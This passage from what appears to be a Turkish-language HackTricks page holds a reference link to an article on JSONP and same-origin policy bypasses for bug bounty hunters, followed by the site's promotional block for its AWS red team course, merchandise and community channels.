* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek katkıda bulunun.**

</details>
